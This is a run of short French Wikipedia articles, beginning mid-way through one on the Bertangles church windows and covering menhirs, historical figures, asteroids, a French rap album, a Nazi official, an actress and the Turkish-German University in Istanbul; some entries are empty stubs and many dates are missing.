L’église de Bertangles conserve deux verrières du siècle dans la chapelle privée, les vitraux représentent des blasons de la famille de Clermont-Tonnerre. Ceux des fenêtres hautes du chœur datent de 1870, ils sont l'œuvre de l’atelier Darquet d'Amiens. Ils représentent saint Vincent et sainte Theudosie. Les vitraux les plus récents ont été réalisés par l'atelier Claude Barre.

</doc>
<doc id="10576384" url="https://fr.wikipedia.org/wiki?curid=10576384" title="Menhirs des Terriers">
Menhirs des Terriers

Les menhirs des Terriers sont un groupe de sept menhirs situés sur la commune des Arcs, dans le département du Var en France.
Description.
Le site a été découvert en 1922 par Marc Borréani lors d'une prospection dans le massif des Maures. Une fouille de sauvetage dirigée par Philippe Hameau y a été entreprise en 1994-1995. Les menhirs ont été retrouvés dressés, couchés, voire partiellement enfouis sur la pente nord de la montagne des Terriers, à environ d'altitude. Le site était parsemé de blocs en gneiss qui ont été reconnus comme des fragments des menhirs. 
Il est probable que les pierres furent extraites d'un affleurement voisin situé à environ du site mais sur l'autre versant de la montagne, soit un dénivelé de à parcourir. Dans cette carrière, un bloc demeuré en place pourrait d'ailleurs correspondre à un menhir en cours d'élaboration qui fut abandonné sur place. A proximité, des lames et éclats de silex, ainsi que des tessons d'une céramique modelée, ont aussi été retrouvé. Les trois plus grands blocs ont été bouchardé pour en aplanir les surfaces ou le sommet (menhir D).
Le décapage en périphérie des pierres n'a révélé ni fosse de fondation ni pierres de calage, la disposition générale originale des pierres est donc inconnue. Elles ont été redressées au plus près de l'emplacement où fut retrouvé chaque fragment inférieur. 
Six tessons d'une céramique orangée ont été recueillis à la base du menhir B. Ils appartiennent à un unique récipient de forme globuleuse avec bord redressé attribué au Néolithique final. 

</doc>
<doc id="10576402" url="https://fr.wikipedia.org/wiki?curid=10576402" title="John Cutts">
John Cutts

John Cutts, baron Cutts (1661 dans l'Essex, Angleterre – à Dublin) est un militaire, écrivain et homme politique britannique.
Biographie.
John Cutts naît dans l'Essex en 1661. Après un court passage au St Catharine's College de Cambridge, il hérite des propriétés familiales, mais préfère se tourner vers une vie de courtisan et militaire. 
Ses ambitions à la fois militaire et littéraire l'amènent à rédiger son premier ouvrage en 1685 : "La Muse de cavalier" (aussi intitulé "An Apology for such Gentlemen as make Poetry their Diversion not their Business"). En 1686, il combat en Hongrie sous les drapeaux de Charles V de Lorraine. En 1687, il publie "Poetical Exercises". L'année suivante, il est lieutenant-colonel en Hollande. Il monte en grade grâce à ses participations à la bataille de la Boyne (1690) et au siège de Limerick (1690). En 1690, le roi Guillaume III d'Orange-Nassau le nomme "Baron Cutts of Gowran" du Royaume d'Irlande. Il poursuit sa vie militaire. Troisième dans la hiérarchie militaire britannique en 1704, il combat une dernière fois lors de la bataille de Blenheim sous les ordres de John Churchill, duc de Marlborough. 
Il a passé le reste de sa vie au Royaume-Uni. À son décès, il cumulait huit postes politiques et militaires distincts, notamment le "Commander-in-Chief, Ireland". Il a représenté le comté de Cambridge dans cinq parlements britanniques. Lors du premier parlement de la reine reine Anne, il a été envoyé à Newport sur l'île de Wight, qu'il a représenté jusqu'à sa mort. 
John Cutts meurt à Dublin en Irlande le . Marié deux fois, il n'a laissé aucune descendance. 
Le général écossais Hugh Mackay l'a décrit ainsi : « plutôt grand, vif et bien bâti, un compagnon agréable montrant un esprit abondant, affable et familier, mais trop obnubilé par la vanité et son sentiment de supériorité ».

</doc>
<doc id="10576414" url="https://fr.wikipedia.org/wiki?curid=10576414" title="Jesús Ángel Solana">
Jesús Ángel Solana



</doc>
<doc id="10576426" url="https://fr.wikipedia.org/wiki?curid=10576426" title="Wilmen Bravo">
Wilmen Bravo

Wilmen Bravo Isaga (né le ) est un coureur cycliste vénézuélien.
Biographie.
En 2006, il est suspendu quatre mois en raison d'un contrôle positif. L'année suivante, il remporte une étape du Tour du Venezuela.
Début 2017, il s’impose sur la quatrième étape du Tour du Táchira.

</doc>
<doc id="10576442" url="https://fr.wikipedia.org/wiki?curid=10576442" title="274P">
274P



</doc>
<doc id="10576443" url="https://fr.wikipedia.org/wiki?curid=10576443" title="(15853) Benedettafoglia">
(15853) Benedettafoglia

(15853) Benedettafoglia est un astéroïde de la ceinture principale.
Description.
(15853) Benedettafoglia est un astéroïde de la ceinture principale. Il fut découvert le à Cima Ekar par Maura Tombelli et Ulisse Munari. Il présente une orbite caractérisée par un demi-grand axe de 2,24 UA, une excentricité de 0,10 et une inclinaison de 5,3° par rapport à l'écliptique.

</doc>
<doc id="10576444" url="https://fr.wikipedia.org/wiki?curid=10576444" title="P/2012 WX32">
P/2012 WX32



</doc>
<doc id="10576445" url="https://fr.wikipedia.org/wiki?curid=10576445" title="(16598) Brugmansia">
(16598) Brugmansia

(16598) Brugmansia est un astéroïde de la ceinture principale.
Description.
(16598) Brugmansia est un astéroïde de la ceinture principale. Il fut découvert le à Caussols par Eric Walter Elst. Il présente une orbite caractérisée par un demi-grand axe de 2,62 UA, une excentricité de 0,22 et une inclinaison de 1,6° par rapport à l'écliptique.

</doc>
<doc id="10576447" url="https://fr.wikipedia.org/wiki?curid=10576447" title="(16680) Minamitanemachi">
(16680) Minamitanemachi

(16680) Minamitanemachi est un astéroïde de la ceinture principale.
Description.
(16680) Minamitanemachi est un astéroïde de la ceinture principale. Il fut découvert le à Kitami par Kin Endate et Kazuro Watanabe. Il présente une orbite caractérisée par un demi-grand axe de 2,68 UA, une excentricité de 0,18 et une inclinaison de 14,1° par rapport à l'écliptique.

</doc>
<doc id="10576448" url="https://fr.wikipedia.org/wiki?curid=10576448" title="(18289) Yokoyamakoichi">
(18289) Yokoyamakoichi

(18289) Yokoyamakoichi est un astéroïde de la ceinture principale.
Description.
(18289) Yokoyamakoichi est un astéroïde de la ceinture principale. Il fut découvert le à Kiso par Hiroki Kosai et Kiichiro Hurukawa. Il présente une orbite caractérisée par un demi-grand axe de 2,81 UA, une excentricité de 0,18 et une inclinaison de 12,2° par rapport à l'écliptique.

</doc>
<doc id="10576450" url="https://fr.wikipedia.org/wiki?curid=10576450" title="(18399) Tentoumushi">
(18399) Tentoumushi

(18399) Tentoumushi est un astéroïde de la ceinture principale.
Description.
(18399) Tentoumushi est un astéroïde de la ceinture principale. Il fut découvert le à Kitami par Kin Endate et Kazuro Watanabe. Il présente une orbite caractérisée par un demi-grand axe de 3,16 UA, une excentricité de 0,20 et une inclinaison de 18,2° par rapport à l'écliptique.

</doc>
<doc id="10576451" url="https://fr.wikipedia.org/wiki?curid=10576451" title="(18524) Tagatoshihiro">
(18524) Tagatoshihiro

(18524) Tagatoshihiro est un astéroïde de la ceinture principale.
Description.
(18524) Tagatoshihiro est un astéroïde de la ceinture principale. Il fut découvert le à Kitami par Kin Endate et Kazuro Watanabe. Il présente une orbite caractérisée par un demi-grand axe de 2,48 UA, une excentricité de 0,07 et une inclinaison de 5,5° par rapport à l'écliptique.

</doc>
<doc id="10576453" url="https://fr.wikipedia.org/wiki?curid=10576453" title="(19288) Egami">
(19288) Egami

(19288) Egami est un astéroïde de la ceinture principale.
Description.
(19288) Egami est un astéroïde de la ceinture principale. Il fut découvert le à Kitami par Kin Endate et Kazuro Watanabe. Une observation de 1977 est considérée comme prédécouverte par le JPL. 
Il présente une orbite caractérisée par un demi-grand axe de 2,57 UA, une excentricité de 0,12 et une inclinaison de 15,5° par rapport à l'écliptique.

</doc>
<doc id="10576454" url="https://fr.wikipedia.org/wiki?curid=10576454" title="(19303) Chinacyo">
(19303) Chinacyo

(19303) Chinacyo est un astéroïde de la ceinture principale.
Description.
(19303) Chinacyo est un astéroïde de la ceinture principale. Il fut découvert le à Kitami par Kin Endate et Kazuro Watanabe. Une observation de 1985 est considérée comme prédécouverte par le JPL. Il apparait sur des photos de 1951.
Il présente une orbite caractérisée par un demi-grand axe de 2,42 UA, une excentricité de 0,21 et une inclinaison de 3,8° par rapport à l'écliptique.

</doc>
<doc id="10576455" url="https://fr.wikipedia.org/wiki?curid=10576455" title="274P/2012 WX32">
274P/2012 WX32



</doc>
<doc id="10576456" url="https://fr.wikipedia.org/wiki?curid=10576456" title="(19953) Takeo">
(19953) Takeo

(19953) Takeo est un astéroïde de la ceinture principale.
Description.
(19953) Takeo est un astéroïde de la ceinture principale. Il fut découvert le à Kiso par Hiroki Kosai et Kiichiro Hurukawa. Il présente une orbite caractérisée par un demi-grand axe de 2,63 UA, une excentricité de 0,14 et une inclinaison de 14,3° par rapport à l'écliptique.

</doc>
<doc id="10576458" url="https://fr.wikipedia.org/wiki?curid=10576458" title="(19954) Shigeyoshi">
(19954) Shigeyoshi

(19954) Shigeyoshi est un astéroïde de la ceinture principale.
Description.
(19954) Shigeyoshi est un astéroïde de la ceinture principale. Il fut découvert le à Kiso par Hiroki Kosai et Kiichiro Hurukawa. Il présente une orbite caractérisée par un demi-grand axe de 2,29 UA, une excentricité de 0,14 et une inclinaison de 6,5° par rapport à l'écliptique.

</doc>
<doc id="10576459" url="https://fr.wikipedia.org/wiki?curid=10576459" title="1931 AN">
1931 AN



</doc>
<doc id="10576468" url="https://fr.wikipedia.org/wiki?curid=10576468" title="Ouandja-Kotto">
Ouandja-Kotto

Ouandja-Kotto est une commune rurale de la préfecture de la Haute-Kotto, en République centrafricaine. Elle s’étend à l’est de la localité de Ouadda et doit son nom à deux cours d’eau : la Ouandja et la Kotto.
Géographie.
Située au nord de la préfecture de Haute-Kotto, la commune est limitrophe de la préfecture de Vakaga.
Villages.
La commune est constituée de 36 villages recensés en 2003 : Alias 1, Alias 2, Aviation, Bandassa (1, 2), Garba, Gboka 1, Gboka 2, Kotto 1, Kotto 2, Kotto 3, Kotto 6, Kpetene, Mission 1, Mission 2, Mission 3, Ngoamandja, Ouandja 2, Yangou Diamant 1, Yangou Diamant 2, Yangou Diamant 3, Yangou Jardin, Yangou-Bamara, Yangoussamba, Yangou-Wassa, Yangou-Yegbandi.
Éducation.
La commune compte 8 écoles en 2013 : Gbali-Kopo, Sam-Ouandja A et Sam-Ouandja B, Yangou-Bamara, Kaga Kouyanga, Kpehgbéré, Kotto 3 et Gbadjangolo.

</doc>
<doc id="10576481" url="https://fr.wikipedia.org/wiki?curid=10576481" title="2012 WX32">
2012 WX32



</doc>
<doc id="10576483" url="https://fr.wikipedia.org/wiki?curid=10576483" title="Tombaugh-Tenagra">
Tombaugh-Tenagra



</doc>
<doc id="10576484" url="https://fr.wikipedia.org/wiki?curid=10576484" title="2003 WZ141">
2003 WZ141



</doc>
<doc id="10576485" url="https://fr.wikipedia.org/wiki?curid=10576485" title="Comète Tombaugh-Tenagra">
Comète Tombaugh-Tenagra



</doc>
<doc id="10576489" url="https://fr.wikipedia.org/wiki?curid=10576489" title="La famille de Nicky">
La famille de Nicky



</doc>
<doc id="10576499" url="https://fr.wikipedia.org/wiki?curid=10576499" title="Anarchie (album)">
Anarchie (album)

Anarchie est le premier album studio du rappeur français SCH, sorti le sous les labels Braabus Music, Def Jam France et Universal.
Histoire.
L'album devient disque de platine trois mois après sa sortie. L'album est officiellement certifié double disque de platine en septembre 2020 soit quatre ans et quatre mois après sa sortie. En juin 2025, l'album est certifié triple disque de platine avec plus de 300 000 ventes, soit neuf ans après sa sortie.
En 2023, le titre "Je la connais" revient sur le devant de la scène, sept ans après sa sortie. Ce regain d'intérêt est liée à une tendance est née sur le réseau social TikTok, d'une part autour du refrain et ses ""Oh, oh, oh, oh, oh oh, oh, oh"," mais aussi avec la phrase ""J'm'emballe, mais j'en ai rien à foutre".". Le morceau fait ainsi son retour dans le Top Singles du SNEP à la place durant la semaine du puis atteint la place trois semaines plus tard. Mi-juin 2023, c'est en position qu'il se place.

</doc>
<doc id="10576500" url="https://fr.wikipedia.org/wiki?curid=10576500" title="Walter Gross (homme politique)">
Walter Gross (homme politique)

Walter Gross, né le à Cassel et mort le à Berlin, est un médecin allemand et un responsable nazi.
Carrière.
Gross étudie la médecine à Göttingen, Tübingen et Munich, puis travaille de 1928 à 1932 comme assistant dans un hôpital de Brunswick.
Il adhère en 1925 au NSDAP, puis en 1932 à la section regroupant médecins du parti en 1932. Il collabore alors au département santé publique du NSDAP. Il fonde et dirige en 1933 le bureau des affaires politiques et raciales, qui devient en le Rassenpolitisches Amt der NSDAP. Gross est membre du Reichstag à partir de 1936. Rosenberg consigne dans son journal personnel en 1940 un entretien qu'il a eu avec Gross, à propos de la fondation de l'institut de biologie et d'étude raciale, en relation avec la Société Kaiser-Wilhelm, et rapporte notamment qu'Eugen Fischer, son directeur, doit « bientôt venir à nous ». Le siège de l'institut doit s'installer à Stuttgart. Gross devient en 1942 le directeur du bureau des sciences du bureau Rosenberg.
Selon l'historienne Claudia Koonz, Gross se suicide le dans sa maison de Berlin-Schlachtensee lors de combats avec des soldats de l'Armée rouge.
Influence.
Gross est l'un des auteurs majeurs des débuts de la revue "Nationalsozialistische Monatshefte". Il est alors rédacteur et éditeur de plusieurs ouvrages antisémites tels "Rasse und Politik" (1934), "Der Weltenumbruch im jüdischen Mythos" (1936) et "Die rassenpolitischen Voraussetzungen zur Lösung der Judenfrage" (1943).
Gross rejette lors d'une conférence le la distinction entre Juifs et « métissés de Juifs » et justifie leur égale exclusion de l'Europe. Cette conférence donne alors le signal d'une action concertée entre le Rassenpolitisches Amt, la Chancellerie du Parti de Martin Bormann et du Reichssicherheitshauptamt pour proposer de traiter, au moins dans les régions orientales occupées, les « métissés de Juifs » comme les « Juifs intégraux », position entérinée lors de la Conférence de Wannsee.

</doc>
<doc id="10576507" url="https://fr.wikipedia.org/wiki?curid=10576507" title="Wolferschwenda">
Wolferschwenda

Wolferschwenda est une commune allemande de l'arrondissement de Kyffhäuser, Land de Thuringe.
Géographie.
Wolferschwenda se situe au nord-est du Heilinger Höhen.
Histoire.
Wolferschwenda est mentionné pour la première fois dans un document signé par Otton II sous le nom de Voulfheresvouinidon.

</doc>
<doc id="10576508" url="https://fr.wikipedia.org/wiki?curid=10576508" title="Pietro Conti">
Pietro Conti

Pietro Conti, né à Spolète le et mort à Pérouse le , est une personnalité politique italienne, membre du Parti communiste italien et premier président de l'Ombrie.
Biographie.
Né dans une famille ouvrière, Pietro Conti a adhéré au Parti communiste italien (PCI) et à la Confédération générale italienne du travail (CGIL). Sa carrière politique commence très jeune quand, simple ouvrier, il s'illustre en défendant les droits syndicaux des travailleurs. Il est alors appelé à Pérouse et devient secrétaire de la fédération des jeunesses communistes, puis de la CGIL d'Ombrie.
En 1970, il devient président de l'Ombrie, une région italienne. Il conserve cette charge jusqu'en 1976. Cette année-là, il est élu au Parlement italien et y reste dix ans. En 1987, peu avant de mourir, il devient maire de Spolète.

</doc>
<doc id="10576527" url="https://fr.wikipedia.org/wiki?curid=10576527" title="Anamaria Vartolomei">
Anamaria Vartolomei

Anamaria Vartolomei est une actrice franco-roumaine, née le à Bacău (Roumanie).
Après plusieurs seconds rôles, elle est révélée par son interprétation d'Anne Duschesne dans le film "L'Événement" (2021) d'Audrey Diwan, adaptation cinématographique de l'écrivaine Annie Ernaux et succès critique important, qui remporte le Lion d'or à la Mostra de Venise. Elle remporte pour ce rôle le Lumière de la meilleure actrice et le César de la meilleure révélation féminine en 2022.
Elle apparaît en 2024, dans le rôle d'Haydée, dans la superproduction "Le Comte de Monte-Cristo" de Matthieu Delaporte et Alexandre de La Patellière.
Biographie.
Jeunesse et formation.
Née le à Bacău (Roumanie), Anamaria Vartolomei est de nationalité franco-roumaine.
Alors qu'elle a , ses parents émigrent en France pour . Elle est alors confiée à ses grands-parents et ne rejoint ses parents, installés à Pantin, qu'à l'âge de . Son père est à l'époque ouvrier dans le bâtiment et sa mère, qui était infirmière diplômée en Roumanie, fait des ménages.
Elle est inscrite à un cours de théâtre, activité extrascolaire de son école primaire d’Issy-les-Moulineaux. Cette expérience lui donne le goût du jeu et ses parents l'encouragent dans cette voie. Alors que son père travaille sur un chantier dans l'appartement d'une comédienne, celle-ci lui indique l'existence d'un site de sélection d’acteurs.
Carrière de comédienne.
Débuts dans des seconds rôles.
En 2011, la jeune Vartolomei participe à la sélection des acteurs du film "My Little Princess". À l'âge de dix ans et demi, elle est choisie parmi pour interpréter l'un des deux rôles principaux aux côtés d'Isabelle Huppert. Cette expérience marque son début au cinéma. Son personnage est fortement inspiré de l'enfance de la réalisatrice, Eva Ionesco. Ce premier rôle vaut à la fillette une nomination pour le prix Lumière de la révélation féminine.
Elle est, à cette époque, embauchée pour la communication publicitaire de la marque d'accessoires Maison Michel, filiale de Chanel.
Elle joue ensuite des rôles secondaires dans des films comme "Jacky au royaume des filles" (2014) ou "L'Idéal" (2016). En 2017, elle incarne Louise-Élisabeth d'Orléans, l'un des principaux personnages de "L'Échange des princesses".
Après le bac, elle s'inscrit au Cours Florent et suit pendant un an la formation de l'école d'art dramatique Les Enfants Terribles, en même temps qu'elle entame un cursus en lettres modernes.
Révélation cinématographique.
En 2021, Anamaria Vartolomei tient le rôle principal du film "L'Événement", réalisé par Audrey Diwan, qui remporte le Lion d'or à la Mostra de Venise. Elle y incarne une jeune femme qui tombe enceinte et souhaite avorter. Le film est une adaptation du roman éponyme semi-autobiographique de l'écrivaine française Annie Ernaux. La critique salue sa prestation : le quotidien "Le Monde" la qualifie, par exemple, d' et "Slate" l’estime . Ce succès l'impose comme l'une des jeunes actrices françaises prometteuses de sa génération. Pour ce rôle, elle reçoit en 2022 le Lumière de la meilleure actrice puis le César de la meilleure révélation féminine.
Elle joue ensuite dans le film de science-fiction "L'Empire", de Bruno Dumont, elle y partage l'affiche avec Fabrice Luchini, Camille Cottin et Lyna Khoudri, avant d'interpréter le rôle de la comédienne Maria Schneider dans le film biographique "Maria", présenté au festival de Cannes, qui revient sur le tournage difficile du "Dernier Tango à Paris" de Bernardo Bertolucci.
En 2024, elle est l'une des têtes d'affiche du film de cape et d'épée "Le Comte de Monte-Cristo". Elle joue également le rôle d'Isabelle de Merteuil dans la série télévisée "Merteuil", sous la direction de Jessica Palud.
La même année, elle est membre du jury du court métrage au festival Premiers Plans d'Angers.

</doc>
<doc id="10576532" url="https://fr.wikipedia.org/wiki?curid=10576532" title="(20243) Den Bosch">
(20243) Den Bosch

(20243) Den Bosch est un astéroïde de la ceinture principale.
Description.
(20243) Den Bosch est un astéroïde de la ceinture principale. Il fut découvert le à La Silla par Eric Walter Elst. Il présente une orbite caractérisée par un demi-grand axe de 1,83 UA, une excentricité de 11,5 et une inclinaison de 7,1° par rapport à l'écliptique.
Il tient son nom du nom familier flamand de la ville de Bois-le-Duc.

</doc>
<doc id="10576534" url="https://fr.wikipedia.org/wiki?curid=10576534" title="(22280) Mandragora">
(22280) Mandragora

(22280) Mandragora est un astéroïde de la ceinture principale.
Description.
(22280) Mandragora est un astéroïde de la ceinture principale. Il fut découvert le à La Silla par Henri Debehogne. Il présente une orbite caractérisée par un demi-grand axe de 3,04 UA, une excentricité de 0,20 et une inclinaison de 0,6° par rapport à l'écliptique.

</doc>
<doc id="10576537" url="https://fr.wikipedia.org/wiki?curid=10576537" title="(22383) Nikolauspacassi">
(22383) Nikolauspacassi

(22383) Nikolauspacassi est un astéroïde de la ceinture principale.
Description.
(22383) Nikolauspacassi est un astéroïde de la ceinture principale. Il fut découvert le à Farra d'Isonzo par l'Observatoire astronomique de Farra d'Isonzo. Il présente une orbite caractérisée par un demi-grand axe de 2,32 UA, une excentricité de 0,16 et une inclinaison de 2,4° par rapport à l'écliptique.

</doc>
<doc id="10576538" url="https://fr.wikipedia.org/wiki?curid=10576538" title="(24945) Houziaux">
(24945) Houziaux

(24945) Houziaux est un astéroïde de la ceinture principale.
Description.
(24945) Houziaux est un astéroïde de la ceinture principale. Il fut découvert le à La Silla par Eric Walter Elst. Il présente une orbite caractérisée par un demi-grand axe de 2,54 UA, une excentricité de 0,10 et une inclinaison de 3,8° par rapport à l'écliptique.
Il est nommé d'après l'astronome belge Léo Houziaux.

</doc>
<doc id="10576539" url="https://fr.wikipedia.org/wiki?curid=10576539" title="(27718) Gouda">
(27718) Gouda

(27718) Gouda est un astéroïde de la ceinture principale.
Description.
(27718) Gouda est un astéroïde de la ceinture principale. Il fut découvert le à La Silla par Eric Walter Elst. Il présente une orbite caractérisée par un demi-grand axe de 2,39 UA, une excentricité de 0,13 et une inclinaison de 7,8° par rapport à l'écliptique.

</doc>
<doc id="10576541" url="https://fr.wikipedia.org/wiki?curid=10576541" title="(28251) Gerbaldi">
(28251) Gerbaldi

(28251) Gerbaldi est un astéroïde de la ceinture principale.
Description.
(28251) Gerbaldi est un astéroïde de la ceinture principale. Il fut découvert le à Caussols par le relevé ODAS. Il présente une orbite caractérisée par un demi-grand axe de 2,93 UA, une excentricité de 0,12 et une inclinaison de 2,9° par rapport à l'écliptique.

</doc>
<doc id="10576543" url="https://fr.wikipedia.org/wiki?curid=10576543" title="(28547) Johannschröter">
(28547) Johannschröter

(28547) Johannschröter est un astéroïde de la ceinture principale.
Description.
(28547) Johannschröter est un astéroïde de la ceinture principale. Il fut découvert le à la station Catalina par le programme CSS. Il présente une orbite caractérisée par un demi-grand axe de 2,24 UA, une excentricité de 0,09 et une inclinaison de 6,4° par rapport à l'écliptique.

</doc>
<doc id="10576545" url="https://fr.wikipedia.org/wiki?curid=10576545" title="(29508) Bottinelli">
(29508) Bottinelli

(29508) Bottinelli est un astéroïde de la ceinture principale.
Description.
(29508) Bottinelli est un astéroïde de la ceinture principale. Il fut découvert le à Caussols par le relevé ODAS. Il présente une orbite caractérisée par un demi-grand axe de 3,13 UA, une excentricité de 0,18 et une inclinaison de 2,3° par rapport à l'écliptique.
Il est nommé en hommage à l'astronome française Lucette Bottinelli.

</doc>
<doc id="10576546" url="https://fr.wikipedia.org/wiki?curid=10576546" title="(29633) Weatherwax">
(29633) Weatherwax

(29633) Weatherwax est un astéroïde de la ceinture principale.
Description.
(29633) Weatherwax est un astéroïde de la ceinture principale. Il fut découvert le à Caussols par le relevé ODAS. Il présente une orbite caractérisée par un demi-grand axe de 2,28 UA, une excentricité de 0,10 et une inclinaison de 4,9° par rapport à l'écliptique.

</doc>
<doc id="10576548" url="https://fr.wikipedia.org/wiki?curid=10576548" title="(29696) Distasio">
(29696) Distasio

(29696) Distasio est un astéroïde de la ceinture principale.
Description.
(29696) Distasio est un astéroïde de la ceinture principale. Il fut découvert le à Caussols par le relevé ODAS. Il présente une orbite caractérisée par un demi-grand axe de 2,80 UA, une excentricité de 0,16 et une inclinaison de 7,7° par rapport à l'écliptique.

</doc>
<doc id="10576550" url="https://fr.wikipedia.org/wiki?curid=10576550" title="(29725) Mikewest">
(29725) Mikewest

(29725) Mikewest est un astéroïde de la ceinture principale.
Description.
(29725) Mikewest est un astéroïde de la ceinture principale. Il fut découvert le à Caussols par le relevé ODAS. Il présente une orbite caractérisée par un demi-grand axe de 3,07 UA, une excentricité de 0,10 et une inclinaison de 2,4° par rapport à l'écliptique.

</doc>
<doc id="10576561" url="https://fr.wikipedia.org/wiki?curid=10576561" title="Eleanor Gibson">
Eleanor Gibson

Eleanor Jack Gibson, née le à Peoria (Illinois), et morte le , est une psychologue américaine et professeure de psychologie, qui s'est intéressée à l'apprentissage de la lecture, et la perception de l'apprentissage chez les nourrissons et les tout-petits.
Biographie.
Elle obtient en 1931 sa licence et en 1933 son master au Smith College. Elle se marie en 1932 avec James J. Gibson. En 1938, elle obtient son doctorat à Université Yale, puis revient enseigner au Smith College. Après quelques années d'interruption pendant la Seconde Guerre mondiale, elle reprend l'enseignement pendant quelques années au Smith College, puis à l'université Cornell, où elle a un poste d'associée de recherche. C'est à Cornell qu'elle crée, avec Richard D. Walk, le . En 1972, elle est nommée professeure de psychologie, première femme professeure de l'université Cornell.
Dans les années 1960-1970, Eleanor Gibson, en partenariat avec James J. Gibson, crée la Gibsonian ecological theory of development, qui souligne l'importance de la perception qui permet aux humains de s'adapter à leur environnement. Sa contribution la mieux connue à la psychologie est le « Visual Cliff », qui étudie la perception de la profondeur et des déficiences visuelles ou motrices à la fois de l'homme et des espèces animales. Cela conduit à une nouvelle compréhension du développement perceptif chez les bébés. L'environnement fournit des informations permettant le développement du système sensoriel, avec l'augmentation de stimuli, de sorte que le développement perceptif corresponde à des stimuli environnementaux. Les nourrissons se développent à partir de l'adaptation à leur environnement.
Une enquête de la "Review of General Psychology" de 2002, concernant les 100 psychologues les plus éminents du la classe à la place, ex æquo avec Paul E. Meehl.

</doc>
<doc id="10576562" url="https://fr.wikipedia.org/wiki?curid=10576562" title="Maison Alaman">
Maison Alaman



</doc>
<doc id="10576566" url="https://fr.wikipedia.org/wiki?curid=10576566" title="Bostock">
Bostock

Patronyme.
Bostock est un patronyme anglo-saxon notamment porté par :
Autre.
Bostock peut aussi désigner :

</doc>
<doc id="10576582" url="https://fr.wikipedia.org/wiki?curid=10576582" title="Matěj Mináč">
Matěj Mináč



</doc>
<doc id="10576590" url="https://fr.wikipedia.org/wiki?curid=10576590" title="Université turco-allemande">
Université turco-allemande

L’Université turco-allemande ( ou , ou ) est une université d'État construite conjointement par la république de Turquie et la République fédérale d'Allemagne. Le campus de l'université se situe dans le district de Beykoz sur la rive orientale du Bosphore. L'université est encore en construction mais sera la plus grande université allemande à l'étranger.
Histoire.
L'idée d'une université turco-allemande apparaît le avec les accords culturels conclus entre les gouvernements allemand et turc. Les premiers projets se développent dans les années 1990 sous le mandat du chancelier allemand Helmut Kohl. Ils ne sont toutefois pas réalisés principalement pour des raisons financières, liées au coût de la réunification allemande. Le , un accord intergouvernemental est conclu entre les deux pays. Ainsi le , les ministres des Affaires étrangères turc Ali Babacan et allemand Frank-Walter Steinmeier et la ministre allemande de l'éducation et de la recherche Annette Schavan signent l'accord fondateur de l'université. Celui-ci fait partie intégrante de l'accord précédemment signé en par Steinmeier et son homologue turc de l'époque Abdullah Gül dans le cadre de l'initiative Ernst-Reuter pour le dialogue et l'information culturelle. La loi concernant la fondation de l'université turco-allemande est publiée le au Journal Officiel turc.
La TDU est financée en commun par les deux États, mais la Turquie assume la plus grande partie des frais. L'université se trouve sur un terrain de douze hectares, ancienne pépinière propriété du ministère de l'Agriculture turc. La Turquie construit et finance les bâtiments et l'infrastructure et supporte les frais courants. Le ministère allemand de l'Éducation et de la Recherche paie pour les enseignants et les conférenciers, finance l'élaboration des programmes d'études, la construction d'un centre linguistique, les subventions des salaires sur place, les bourses ainsi que la formation continue. Les frais du côté allemand sont estimés à d'euros pour les quatre premières années, et à d'euros au total.
En , un consortium d'initialement 22 universités allemandes est créé et coordonne avec l'Office allemand des échanges universitaires (DAAD) et le haut conseil universitaire de Turquie l'aspect académique de la TDU. Ils gèrent les détails de la création de l'université, le fonctionnement, le financement ainsi que les autorisations. Le consortium regroupe aujourd'hui 27 membres (26 universités et le DAAD). Le Bureau est séparé entre 6 universités et présidé pendant 3 ans par Rita Süssmuth, ancienne présidente du Bundestag. En plus des partenaires universitaires, des entreprises et fondations privées participent également à la planification.
La première pierre de la TDU est posée le en présence du président allemand de l'époque Christian Wulff et du président turc Abdullah Gül. Le processus s'enclenche ensuite avec des cours préparatoires de langues, des séminaires ainsi que des ateliers professionnels afin de former le personnel, les collaborateurs. L'enseignement à l'université commence au semestre hivernal 2013/2014 dans des bâtiments provisoires du district de Beykoz sur la rive orientale de la Mer Noire, là où seront érigés les bâtiments définitifs. On prévoit une capacité maximale de 5000 étudiants après 3 ou 4 années de fonctionnement à grande échelle. Une extension de bâtiment est envisageable et offrirait la perspective de d'accueil pour les étudiants. Lors de l'année scolaire 2013/2014, l'université a accueilli ses premiers étudiants dans les domaines du droit, de l'administration et de la mécatronique. Ils étaient au nombre de 40, plus 5 étudiants étrangers. La cérémonie d'ouverture de la TDU a eu lieu en présence du président allemand Joachim Gauck et du président turc Abdullah Gül, le .
En février 2021, on a appris que Taceddin Kutay, qui enseigne à l'université et travaille pour le journal Akşam, qui est lié au néo-ottoman AKP, écrit en permanence des tweets racistes et homophobes. Cela a été massivement scandalisé par le corps étudiant.
Université.
La TDU est une université d'État sous réglementation turque. Le recteur de l'université est turc, il est engagé par les institutions nationales, son adjoint est allemand. Le , le président turc Abdullah Gül nomme, parmi les trois propositions du conseil universitaire, Ziya Şanal en tant que recteur fondateur. Celui-ci était, jusqu'ici professeur à la faculté d'ingénierie civile de l'école supérieure des sciences appliquées de Munich. Désormais il est remplacé par Halil Akkanat, qui est également en poste à la faculté de droit de la TDU en tant que doyen fondateur.
La TDU est composée de 5 facultés.
Les principales sont : 
Elle propose également les domaines : 
Il existe aussi un pôle langues étrangères (Université de Bielefeld).
L'admission des élèves turcs se passe obligatoirement en Turquie via un examen d'entrée, le (il n'existe pas au lycée turc d'examen de fin d'études secondaires équivalent au baccalauréat allemand). Pour les diplômés des écoles allemandes, la sélection se fait sur les résultats du baccalauréat, celui-ci étant encore reconnu officiellement.
Les filières sont interculturelles. La langue d'enseignement, à la différence des autres universités allemandes à l'étranger, est principalement l'allemand, certains cours sont aussi en turc et en anglais. Par conséquent les élèves sont en majorité diplômés de lycées turcs proposant un enseignement en langue allemande (par exemple le Lycée d'Istanbul, l'école allemande d’Istanbul et le collège autrichien Saint Georgs) ou qui proposent un programme éducatif allemand. Les élèves sont également diplômés des lycées allemands, qu'ils soient allemands ou turcs. Par principe l'université est ouverte à l'international. Des cours d'allemand sont proposés aux élèves, ainsi que la possibilité de passer quelques semestres en Allemagne. Les autres principales caractéristiques de la TDU sont les échanges scientifiques étroits avec des universités allemandes et une coopération intensive avec les entreprises turques et allemandes.
Les diplômés reçoivent un diplôme commun aux deux pays de la TDU (Allemagne et Turquie) ou un double diplôme; licence, Master, Doctorat. La qualité de ces diplômes et du programme d'études sont certifiés à la conférence de Bologne.

</doc>
<doc id="10576596" url="https://fr.wikipedia.org/wiki?curid=10576596" title="Garrick Ollivander">
Garrick Ollivander



</doc>
<doc id="10576613" url="https://fr.wikipedia.org/wiki?curid=10576613" title="Ollivander (boutique)">
